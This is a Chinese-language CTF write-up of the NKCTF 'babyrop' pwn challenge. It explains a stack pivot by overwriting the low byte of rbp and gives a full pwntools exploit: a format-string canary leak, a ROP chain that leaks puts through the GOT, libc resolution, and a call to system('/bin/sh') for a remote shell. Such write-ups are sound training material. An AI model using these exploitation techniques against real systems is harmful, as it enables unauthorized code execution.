---
title: nkctf_babyrop
date: 2023-03-26 22:05:12
categories: 
- pwn_wp
tags: 
- pwn
- ROP
- format

---

nkctf的babyrop，思路和西湖论剑2022的baby calc一样，不过简单了不少。

都是通过覆盖rbp低位为`\x00`栈迁移到前面的rop链进行ROP，不过这里有canary，需要先通过格式化字符串泄露canary。

<!-- more -->

```sh
[*] '/home/a1ph0nse/PwnPractice/CtfGame/NK/baby_rop/nkctf_babyrop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

开了NX和Canary

```py
from pwn import *
from LibcSearcher import *
context(log_level='debug',os='linux',arch='amd64')
filename='nkctf_babyrop'
elf=ELF('./'+filename)
# libc=ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
# p=process("./"+filename)  
p = remote("node4.buuoj.cn",)

s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))

def debug(cmd='\n'):
  gdb.attach(p,cmd)
  pause()

pop_rdi_ret=0x0000000000401413
pop_rsi_r15_ret=0x0000000000401411
start_addr=0x4010f0
bss_addr=0x404500
leave_ret=0x40138A
ret_addr=0x40138B
my_read=0x40123B

puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
read_plt=elf.plt['read']

payload="%41$p"
ru("your name: ")
sl(payload)
ru("Hello, 0x")
canary=int(r(16),16)
leak("canary:",hex(canary))

payload=p64(ret_addr)*20
payload+=p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)
payload+=p64(pop_rdi_ret)+p64(bss_addr)
payload+=p64(pop_rsi_r15_ret)+p64(0x9)+p64(0xdeadbeef)
payload+=p64(my_read)
payload+=p64(start_addr)
payload=payload.ljust(0x100 - 0x8,b'a')+p64(canary)

ru("the NKCTF: ")
s(payload)

puts_addr = u64(ru("\x7f")[-6:].ljust(8,b'\x00'))

libc=LibcSearcher('puts', puts_addr)
libc_base=puts_addr-libc.dump('puts')
system_addr=libc_base+libc.dump('system')

leak("puts_addr:",hex(puts_addr))
leak("system_addr:",hex(system_addr))
leak("libc_base:",hex(libc_base))

sl("/bin/sh")

payload="%41$p"
ru("your name: ")
sl(payload)
ru("Hello, 0x")
canary=int(r(16),16)
leak("canary:",hex(canary))

payload=p64(ret_addr)*20
payload+=p64(pop_rdi_ret)+p64(bss_addr)+p64(system_addr)
payload=payload.ljust(0x100-0x8,b'a')+p64(canary)

ru("the NKCTF: ")
s(payload)

# debug()

itr()
```

